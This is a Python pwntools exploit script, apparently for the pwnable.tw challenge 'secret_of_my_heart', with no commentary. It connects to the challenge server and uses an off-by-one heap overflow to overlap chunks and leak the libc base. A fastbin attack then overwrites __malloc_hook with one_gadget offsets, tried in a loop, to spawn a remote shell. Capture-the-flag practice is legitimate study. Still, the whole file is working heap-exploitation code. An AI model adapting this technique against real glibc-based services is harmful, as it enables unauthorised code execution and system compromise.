from pwn import *
elf = ELF("./secret_of_my_heart")
libc = ELF("./libc_64.so.6")
ld = ELF("./ld-2.23.so")
context.binary=elf
gadgets=[0x45216,0x4526a,0xcc543,0xcc618,0xef6c4,0xef6d0,0xf0567,0xf5b10]
for gadget in gadgets:
	target=remote('chall.pwnable.tw',10302)

	def sla(string,val):
		target.sendlineafter(string,val)

	def sa(string,val):
		target.sendafter(string,val)

	def add(size,secret="A",name="A"*0x20):
		sla("choice :",str(1))
		sla("heart : ",str(size))
		sa("heart :",name)
		sa("heart :",secret)

	def leaks(index):
		sla("choice :",str(2))
		sla("Index :",str(index))
		target.recvuntil("Secret : ")
		secret=target.recvline().strip("\n")
		return secret

	def delete(index):
		sla("choice :",str(3))
		sla("Index :",str(index))

	add(0xf0)
	add(0x60)
	add(0xf0)
	add(0x60)
	delete(0)
	delete(1)
	payload="A"*0x60+p64(0x170)
	add(0x68,payload)
	delete(2)
	add(0xf0)
	libc_base=u64(leaks(0).ljust(8,"\x00"))-0x3c3b78
	libc_gadget=libc_base+gadget
	add(0x60)
	delete(0)
	delete(3)
	delete(2)
	payload=p64(libc_base+0x3c46bd)
	add(0x68,payload)
	add(0x68)
	add(0x68)
	payload="\x00"*(0x2b-8)+p64(libc_gadget)+p64(libc_base+0x3c46f0-7*8)
	add(0x68,payload)
	target.interactive()
